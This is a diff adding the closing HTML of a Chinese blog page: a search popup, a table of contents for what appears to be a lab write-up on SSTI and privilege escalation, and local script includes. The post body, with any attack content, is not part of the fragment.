+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSTI%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">SSTI漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">靶机内信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">4.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C"><span class="nav-number">5.</span> <span class="nav-text">提权操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local-search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
